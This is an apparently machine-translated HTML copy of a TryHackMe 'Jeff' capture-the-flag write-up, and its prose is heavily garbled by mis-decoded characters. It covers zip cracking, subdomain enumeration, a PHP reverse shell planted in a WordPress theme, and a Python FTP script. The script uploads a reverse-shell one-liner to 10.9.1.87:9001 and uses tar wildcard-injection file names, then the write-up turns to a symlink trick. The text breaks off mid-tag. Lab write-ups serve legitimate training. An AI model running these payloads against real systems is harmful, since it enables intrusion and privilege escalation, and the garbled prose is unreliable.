<html>
<head>
<title>TryHackMe â€” Jeff</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe â€”æ°å¤«</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-jeff-fc2fe2a3161a?source=collection_archive---------0-----------------------#2021-10-21">https://infosecwriteups.com/tryhackme-jeff-fc2fe2a3161a?source=collection_archive---------0-----------------------#2021-10-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/6e3aa2e13ad5b78f3bb9c4a6d9df6039.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7P-wOmhay26HMTVPvaj5uA.png"/></div></div></figure><p id="03e5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯Piyush AchÃ¤ ryaï¼Œä»Šå¤©æˆ‘å°†å‘å¤§å®¶å±•ç¤ºå¦‚ä½•å®Œæˆ<strong class="ka ir">æ°å¤«</strong>æŒ‘æˆ˜ã€‚è®©æˆ‘ä»¬å¼€å§‹å§ã€‚</p><figure class="kw kx ky kz gt jr"><div class="bz fp l di"><div class="la lb l"/></div></figure><p id="e90d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æè¿°:ä½ èƒ½é»‘æ‰æ°å¤«çš„ç½‘ç»œæœåŠ¡å™¨å—ï¼Ÿ</p><p id="67f3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="lc">é“¾æ¥åˆ°æˆ¿é—´</em>:<a class="ae ld" href="https://tryhackme.com/room/jeff" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/jeff</a></p><p id="4462" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç­‰çº§:ç¡¬(æ˜¾ç„¶æ˜¯ğŸ˜‰)</p><h1 id="221d" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">æˆ‘ä»¬å¼€å§‹å§</h1><p id="4e65" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œå¯åŠ¨æœºå™¨å¹¶è¿è¡Œä¸€äº›Nmapæ‰«æï¼Œåªæœ‰ä¸¤ä¸ªç«¯å£æ˜¯å¼€æ”¾çš„22(SSH)å’Œ80(WebæœåŠ¡å™¨)ã€‚æ²¡ä»€ä¹ˆç‰¹åˆ«çš„:(</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="e203" class="mm lf iq mi b gy mn mo l mp mq">nmap -sC -sV -T4 -vv &lt;IP&gt; -oA nmap</span></pre><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/33a230963063eecdf7d3ac0cb67e7170.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ymEjdemU9x8WTzGvrwZ5MQ.png"/></div></div></figure><p id="e8d5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å°è¯•è®¿é—®webæœåŠ¡å™¨æ—¶å‡ºç°ç©ºç™½å±å¹•ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†â€œjeff.thmâ€æ·»åŠ åˆ°/etc/hostsä¸­ï¼Œä»¥ä¾¿è®¿é—®ç½‘ç«™ã€‚</p><p id="00dc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">è®©æˆ‘ä»¬çœ‹çœ‹ç½‘ç«™ä¸Šæœ‰ä»€ä¹ˆã€‚è¯¥ç½‘ç«™æ˜¯é™æ€çš„ï¼Œæ²¡æœ‰é“¾æ¥ã€‚æµè§ˆç½‘ç«™æ—¶ï¼Œæˆ‘ä»¬æ²¡æœ‰å‘ç°ä»»ä½•æœ‰è¶£çš„ä¸œè¥¿ã€‚</p><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/05c4698dffdda4349e03587ad622eacb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zDSHx658eyOLDyY7CToAOA.png"/></div></div></figure><p id="5a86" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å› æ­¤ï¼Œæˆ‘å¼€å§‹ä½¿ç”¨<a class="ae ld" href="https://github.com/maurosoria/dirsearch" rel="noopener ugc nofollow" target="_blank"> dirsearch </a>åˆ—ä¸¾ç½‘ç«™çš„éšè—æ–‡ä»¶å’Œç›®å½•ã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="d6f5" class="mm lf iq mi b gy mn mo l mp mq">dirsearch -u <a class="ae ld" href="http://jeff.thm" rel="noopener ugc nofollow" target="_blank">http://jeff.thm</a> --exclude-status 401</span></pre><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/c9ac1a4ae7a312a0265309d69178ad7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t_YJEp5j4aIJyHk6bVgHIw.png"/></div></div></figure><p id="ea7b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘ä»¬å‘ç°ä¸€äº›æœ‰è¶£çš„ç›®å½•/adminã€/uploadså’Œ/backupsã€‚åœ¨è®¿é—®/uploadsç›®å½•æ—¶ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªâ€œå…”å­æ´â€,æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä½†æ²¡æœ‰ä»»ä½•åŠŸèƒ½ã€‚ç„¶åæˆ‘å°è¯•é€’å½’åœ°å¼ºåˆ¶/backupsç›®å½•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶<strong class="ka ir"> ' </strong> backup.zip <strong class="ka ir">'ã€‚</strong></p><p id="4dc9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">è®©æˆ‘ä»¬è§£å‹ç¼©å®ƒï¼Œçœ‹çœ‹å®ƒèƒ½æä¾›ä»€ä¹ˆï¼Œä½†æ˜¯ï¼Œè¯¥æ–‡ä»¶å—å¯†ç ä¿æŠ¤ã€‚å¥½éš¾è¿‡ï¼ğŸ˜¢ã€‚è®©æˆ‘ä»¬è¯•ç€ç”¨<em class="lc"> fcrackzip </em>è§£å‹å®ƒ</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="34af" class="mm lf iq mi b gy mn mo l mp mq">fcrackzip -D -p -v /usr/share/wordlists/rockyou.txt ~/Downloads/backup.zip</span></pre><p id="4822" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">è®©æˆ‘ç»™ä½ è§£é‡Šä¸€äº›æ ‡å¿—:</p><ul class=""><li id="7cdd" class="mu mv iq ka b kb kc kf kg kj mw kn mx kr my kv mz na nb nc bi translated">d:è¿è¡Œå­—å…¸æ”»å‡»ã€‚</li><li id="3dd8" class="mu mv iq ka b kb nd kf ne kj nf kn ng kr nh kv mz na nb nc bi translated">-p:å¯†ç åˆ—è¡¨(rockyou.txt)ã€‚</li><li id="2144" class="mu mv iq ka b kb nd kf ne kj nf kn ng kr nh kv mz na nb nc bi translated">-v:ç”¨äºè¯¦ç»†è¾“å‡ºã€‚</li></ul><p id="3da6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å‡ ç§’é’Ÿä¹‹å†…ï¼Œå®ƒå°±ç»™äº†æˆ‘ä»¬å¯†ç ã€‚</p><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/bbc43e8b1fdffb7014a9b319659a3e9f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FJPOIbJHhv_zVx4ZAcfUqA.png"/></div></div></figure><p id="a2ad" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶â€˜WP admin . bak â€™,å®ƒæš—ç¤ºæˆ‘ä»¬å®ƒåŒ…å«äº†WordPressç«™ç‚¹çš„ç®¡ç†å‘˜å¤‡ä»½å‡­è¯ã€‚ç­‰ç­‰Wordpressç½‘ç«™ï¼Ÿä½†æ˜¯ç½‘ç«™'<em class="lc"> jeff.thm </em>'ä¸æ˜¯ä¸€ä¸ªwordpressç½‘ç«™ï¼Œä½†æ˜¯å¼€å‘è€…è¯´ä»–æ­£åœ¨å»ºç«‹ä¸€ä¸ªwordpressç½‘ç«™ï¼Œä»–å°†åœ¨æœªæ¥è¿›è¡Œå‡çº§ï¼Œæ‰€ä»¥è‚¯å®šæœ‰ä¸€ä¸ªä»–å¯èƒ½æ‰˜ç®¡wordpressçš„å­åŸŸã€‚</p><p id="4b38" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æ‰€ä»¥ï¼Œè®©æˆ‘ä»¬è¯•ç€è¿è¡Œä¸€ä¸ªå­åŸŸæšä¸¾çš„å·¥å…·ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä½¿ç”¨äº†vhostæ¨¡å¼ä¸‹çš„gobusteræ¥å‘ç°å­åŸŸã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="c560" class="mm lf iq mi b gy mn mo l mp mq">gobuster vhost -u http://jeff.thm -w usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></pre><p id="daf7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">å¹¶ä¸”ï¼Œæˆ‘ä»¬æˆåŠŸåœ°æ‰¾åˆ°äº†ä¸€ä¸ªç«™ç‚¹:<code class="fe nj nk nl mi b">Found: wordpress.jeff.thm (Status: 200) [Size: 25901]</code></p><p id="347e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç„¶åï¼Œæˆ‘å°†è¿™ä¸ªä¸»æœºåæ·»åŠ åˆ°æˆ‘çš„â€œ/etc/hostsâ€æ–‡ä»¶ä¸­ï¼Œå¹¶æ‰“å¼€ç½‘ç«™ã€‚æˆ‘ä»¬æœ‰wordpressçš„åŸºæœ¬ç´¢å¼•é¡µé¢ã€‚</p><p id="f563" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘ä»¬ä»<code class="fe nj nk nl mi b">backup.zip</code> wpadmin.bakä¸­çŸ¥é“äº†å¯†ç ï¼Œå¹¶æŸ¥çœ‹äº†è¯¥ç½‘ç«™ï¼Œâ€œjeffâ€å¯èƒ½æ˜¯ç”¨æˆ·åã€‚è®©æˆ‘ä»¬ç”¨è¿™äº›å‡­è¯ç™»å½•<code class="fe nj nk nl mi b"><a class="ae ld" href="http://wordpress.jeff.thm/wp-admin" rel="noopener ugc nofollow" target="_blank">http://wordpress.jeff.thm/wp-admin</a></code>ã€‚</p><h1 id="3517" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">å‰¥å‰Š(ä¹è¶£å¼€å§‹ï¼ğŸ˜)</h1><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/fce7a2db1f45b5f6467f6f48fb08438a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JuYw8vv_E61SiPbvMwKnOg.png"/></div></div></figure><p id="2b5c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ·»åŠ æ¥è‡ª<a class="ae ld" href="https://github.com/pentestmonkey/php-reverse-shell" rel="noopener ugc nofollow" target="_blank"> pentestmonkey </a>çš„PHPåå‘shellæ¥è·å¾—ä¸€ä¸ªåå‘shellã€‚æœ‰å¤šç§æ–¹æ³•å¯ä»¥è·å¾—ä¸€ä¸ªåå‘å¤–å£³ï¼Œæˆ‘å°†é€šè¿‡æ·»åŠ æ¥è‡ª404.php pentest monkeyçš„æ¶æ„ä»£ç æ¥ä½¿ç”¨ä¸€ä¸ªä¸æ´»è·ƒçš„ä¸»é¢˜ã€‚</p><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nn"><img src="../Images/1fbfa45a6060f2b2e1a58f9bd7959807.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4W6MDPExZPq_eyoQqsXZtw.png"/></div></div></figure><p id="8d9c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ä¸€æ—¦æˆ‘ä»¬æ›´æ”¹äº†IPåœ°å€å’Œç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥å•å‡»<em class="lc">æ›´æ–°æ–‡ä»¶</em> <strong class="ka ir"> <em class="lc"> </em> </strong>æŒ‰é’®ã€‚</p><p id="e569" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">åœ¨æˆ‘ä»¬è®¿é—®æµè§ˆå™¨ä¸Šçš„é“¾æ¥ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯åŠ¨ç›‘å¬ç«¯å£ï¼Œä»¥ä¾¿è·å¾—ä¸€ä¸ªåå‘shellã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="29af" class="mm lf iq mi b gy mn mo l mp mq">nc -nvlp 9009</span></pre><p id="bbd1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦å‘URLå‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œè¦ä¹ˆä½¿ç”¨curlå‘½ä»¤ï¼Œè¦ä¹ˆé€šè¿‡æµè§ˆå™¨ç›´æ¥è®¿é—®å®ƒã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="85af" class="mm lf iq mi b gy mn mo l mp mq">curl <a class="ae ld" href="http://wordpress.jeff.thm/wp-content/themes/twentyninetten/404.php" rel="noopener ugc nofollow" target="_blank">http://wordpress.jeff.thm/wp-content/themes/twentyninetten/404.php</a></span></pre><p id="2c66" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æœ€åï¼Œæˆ‘ä»¬æœ€åˆçš„ç«‹è¶³ç‚¹æ˜¯æœºå™¨ä¸­çš„www-dataã€‚åˆ—ä¸¾æˆ‘ä»¬çœ‹åˆ°çš„æœºå™¨â€ã€‚dockerenv "æ–‡ä»¶ï¼Œå®ƒè¡¨æ˜æˆ‘ä»¬åœ¨dockerå®¹å™¨ä¸­ã€‚è¿è¡Œ<a class="ae ld" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank"> LinPeas </a>å¹¶æ²¡æœ‰æ­ç¤ºå¤ªå¤šå…³äºè¿™ä¸ªç›’å­çš„ä¿¡æ¯ï¼Œè€Œæ˜¯/var/www/data/ftp_backup.phpä¸­çš„ä¸€ä¸ªæ–‡ä»¶ã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="172f" class="mm lf iq mi b gy mn mo l mp mq">&lt;?php                                                                                          <br/>/*                                             <br/>    Todo: I need to finish coding this database backup script.<br/>          also maybe convert it to a wordpress plugin in the future.                           <br/>*/                                                                                             <br/>$dbFile = 'db_backup/backup.sql';              <br/>$ftpFile = 'backup.sql';                                                                                                                                                                      <br/>                                               <br/>$username = "backupmgr";                                                                                                                                                                      <br/>$password = &lt;password&gt;;                                                                                                                                                         <br/>                                               <br/>$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host            <br/>                                               <br/>if( ! ftp_login($ftp, $username, $password) ){<br/>    die("FTP Login failed.");                                                                                                                                                                <br/>}        <br/>                                                                                               <br/>$msg = "Upload failed";                                                                        <br/>if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {        <br/>    $msg = "$file was uploaded.\n";                                                            <br/>}                                                                                              <br/>                                                                                               <br/>echo $msg;                                                                                     <br/>ftp_close($conn_id);</span></pre><p id="5e9a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">è¿™ä¸ªä¸å®Œæ•´çš„PHPè„šæœ¬ä¸FTPè¯•å›¾ä¸Šä¼ æ•°æ®åº“å¤‡ä»½â€œbackup.sqlâ€æœ‰å…³ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™ä¸ªè„šæœ¬ä¸­çœ‹åˆ°ã€‚ä½†æ˜¯å½“æˆ‘ä»¬è¿è¡ŒNmapæ‰«ææ—¶ï¼ŒFTPæ²¡æœ‰æ‰“å¼€ã€‚æ€ä¹ˆä¼šï¼ŸğŸ¤”</p><p id="c95a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æ‰€ä»¥åœ¨è¿™ä¸€åˆ»ï¼Œæˆ‘ä¸çŸ¥é“è¯¥åšäº›ä»€ä¹ˆï¼Œå› ä¸ºåœ¨æˆ‘è¿‡å»åšçš„ä»»ä½•ä¸€éƒ¨CTFç”µå½±ä¸­ï¼Œæˆ‘éƒ½æ²¡æœ‰é¢ä¸´è¿‡è¿™æ ·çš„æŒ‘æˆ˜ã€‚æˆ‘çŸ¥é“é€šé…ç¬¦åˆ©ç”¨ï¼Œä½†æˆ‘ä¸çŸ¥é“pythonæœ‰ä¸€ä¸ªåä¸ºâ€œftplibâ€çš„æ¨¡å—ã€‚æˆ‘ä¸å¾—ä¸åšå¾ˆå¤šç ”ç©¶ï¼Œä½†æ˜¯è¿æ°”ä¸å¥½ï¼Œæˆ‘ä¸èƒ½åˆ©ç”¨å®ƒã€‚ä½†æ˜¯åœ¨äº’è”ç½‘ä¸Šåšäº†ä¸€äº›ç ”ç©¶åï¼Œæˆ‘å‘ç°äº†ä¸‹é¢çš„è„šæœ¬ğŸ˜‰ã€‚</p><p id="ebd4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç”±äºFTPæœåŠ¡å™¨åªèƒ½ä»å†…éƒ¨ç½‘ç»œè®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonæ¥å®Œæˆæˆ‘ä»¬çš„å·¥ä½œã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="cdef" class="mm lf iq mi b gy mn mo l mp mq">#!/usr/bin/env python3.7 <br/> <br/>from ftplib import FTP<br/>import io <br/>import os<br/>import fileinput<br/> <br/>host = "172.20.0.1"<br/>username = "backupmgr"<br/>password = "&lt;PASSWORD&gt;" # Password we found in ftp_backup.php<br/> <br/>ftp = FTP(host=host)<br/> <br/>login_status = ftp.login(user=username, passwd=password)<br/>print(login_status)<br/>ftp.set_pasv(False)<br/>ftp.cwd('files')<br/>print(ftp.dir())<br/> <br/>rev = io.BytesIO(b'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.87",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')<br/>emptyFile = io.BytesIO(b'')<br/>ftp.storlines('STOR rev.sh', rev)<br/>ftp.storlines('STOR --checkpoint=1', emptyFile)<br/>ftp.storlines('STOR --checkpoint-action=exec=sh rev.sh', emptyFile)<br/>ftp.dir()</span></pre><p id="fcc3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ä¸€ä¸ªcrontabæ­£åœ¨å®¹å™¨å¤–è¿è¡Œï¼ç”¨æˆ·<code class="fe nj nk nl mi b">backupmgr</code>æ¯éš”å‡ åˆ†é’Ÿè¿è¡Œ<code class="fe nj nk nl mi b">tar</code>ï¼Œå¹¶ä½¿ç”¨é€šé…ç¬¦<code class="fe nj nk nl mi b">*</code>æ¥åŒ…å«<code class="fe nj nk nl mi b">ftp://files</code>ç›®å½•ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚å› ä¸ºtarå®¹æ˜“å—åˆ°é€šé…ç¬¦*çš„æ”»å‡»ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å®ƒã€‚</p><p id="dd4d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æœ¬åœ°æœºå™¨ä¸Šæ‰˜ç®¡ä¸€ä¸ªpython webæœåŠ¡å™¨ï¼Œå°†è¿™ä¸ªè„šæœ¬ä¼ è¾“åˆ°ç›®æ ‡æœºå™¨ä¸Šã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="7480" class="mm lf iq mi b gy mn mo l mp mq">python3 -m http.server 80</span></pre><p id="ed50" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">åœ¨ç›®æ ‡è®¡ç®—æœºä¸­ï¼Œå°†ç›®å½•æ›´æ”¹ä¸º/tmpï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ä½ç‰¹æƒç”¨æˆ·ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯¹ä»»ä½•å…¶ä»–ç›®å½•çš„å†™æƒé™ã€‚åœ¨ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨wgetï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½æ‰˜ç®¡çš„pythonè„šæœ¬ã€‚ä¸‹è½½å®Œpythonè„šæœ¬åï¼Œæˆ‘ä»¬éœ€è¦å°†æƒé™æ›´æ”¹ä¸ºå¯æ‰§è¡Œã€‚</p><p id="efb4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">åœ¨æ‰§è¡Œpythonæ–‡ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¼€å§‹ç›‘å¬æœ¬åœ°æœºå™¨ã€‚</p><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/eeb34bb66fd2c54bfe71d52374c67737.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oVUYqTOwAlHgtxpXipB-OA.png"/></div></div></figure><p id="992b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘ä»¬æˆåŠŸåœ°è·å¾—äº†ä¸€ä¸ªshellä½œä¸ºç”¨æˆ·â€˜backup mgrâ€™ã€‚è®©æˆ‘ä»¬å°è¯•è¯»å–user.txtï¼Œä½†é—æ†¾çš„æ˜¯ï¼Œæˆ‘ä»¬å¾—åˆ°çš„æ˜¯â€œæƒé™è¢«æ‹’ç»â€ğŸ˜¥ã€‚å› æ­¤ï¼Œæœºå™¨ä¸Šå¿…é¡»æœ‰å¦ä¸€ä¸ªç”¨æˆ·æœ‰æƒè¯»å–user.txtæ–‡ä»¶ã€‚åœ¨è¯»å–â€œ/etc/passwdâ€æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”¨æˆ·â€œjeffâ€ã€‚æ‰€ä»¥æ˜¯æ—¶å€™å†æ¬¡å‡çº§æˆ‘ä»¬çš„ç‰¹æƒæ‚²å“€äº†ï¼</p><h1 id="ec40" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">ä»Backupmgråˆ°Jeffçš„æƒé™æå‡</h1><p id="f356" class="pw-post-body-paragraph jy jz iq ka b kb mc kd ke kf md kh ki kj me kl km kn mf kp kq kr mg kt ku kv ij bi translated">æˆ‘ä»¬å·²ç»æˆåŠŸåœ°é€ƒç¦»äº†dockerå®¹å™¨ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šäº‹æƒ…è¦åšâ€œbackupmgr -&gt; jeff -&gt; rootâ€ã€‚æœç´¢ç”¨æˆ·æ°å¤«çš„æ–‡ä»¶å’Œç›®å½•ï¼Œæˆ‘ä»¬å‘ç°ä¸€äº›é‡è¦çš„æ–‡ä»¶ã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="458d" class="mm lf iq mi b gy mn mo l mp mq"><strong class="mi ir">backupmgr@tryharder:/home$</strong> find / -user jeff 2&gt;/dev/null<br/>/opt/systools<br/>/opt/systools/systool<br/>/home/jeff<br/>/var/backups/jeff.bak<br/><strong class="mi ir">backupmgr@tryharder:/home$</strong></span></pre><p id="f742" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">â€œ/var/backups/jeff.bakâ€å¯èƒ½åŒ…å«æˆ‘ä»¬ç°åœ¨æ— æ³•è®¿é—®çš„ç”¨æˆ·â€œjeffâ€å‡­æ®ã€‚ä½†æ˜¯æœ‰ä¸€æ ·ä¸œè¥¿å¾ˆçªå‡ºï¼Œé‚£å°±æ˜¯â€œ<code class="fe nj nk nl mi b">/opt/systools/systool</code>â€ã€‚ä½†å¹¸è¿çš„æ˜¯ï¼Œsystoolæ˜¯ä»¥â€œpwmanâ€ç»„çš„æƒé™è¿è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€äº›æ–¹æ³•æ¥åˆ©ç”¨è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ¥æå‡æˆ‘ä»¬å¯¹ç”¨æˆ·jeffçš„æƒé™ã€‚</p><p id="b671" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">æˆ‘ä»¬åœ¨â€œ/opt/systoolsâ€ç›®å½•ä¸­çœ‹åˆ°message.txtï¼Œå½“æˆ‘ä»¬è¿è¡ŒsystooläºŒè¿›åˆ¶æ–‡ä»¶çš„é€‰é¡¹2æ—¶ï¼Œæ€»æ˜¯ä¼šè¯»å–å®ƒã€‚æˆ‘ä»¬å¯ä»¥åˆ é™¤message.txtï¼Œå¹¶å°†â€œ/opt/backups/jeff.bakâ€é“¾æ¥åˆ°message.txtï¼Œè¿™æ ·æ¯å½“systoolè¿è¡Œæ—¶ï¼Œå®ƒéƒ½ä¼šå°è¯•è¯»å–â€œjeff.bakâ€çš„å†…å®¹ã€‚</p><pre class="kw kx ky kz gt mh mi mj mk aw ml bi"><span id="335d" class="mm lf iq mi b gy mn mo l mp mq">ln -s /var/backups/jeff.bak message.txt</span></pre><figure class="kw kx ky kz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/fc53898ace105f2c4c3d1c88257ccaac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Fdi9e0MmMSir6Ap2KNiYFw.png"/></div></div></figure><p id="6516" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">ç°åœ¨ï¼Œç”±äºsshåœ¨ç«¯å£22ä¸Šæ˜¯å¼€æ”¾çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç»™å®šçš„å‡­è¯SSHåˆ°ç”¨æˆ·jeffå¹¶è¯»å–user.txtã€‚</p><pre class="kw kx ky kz gt mh mi 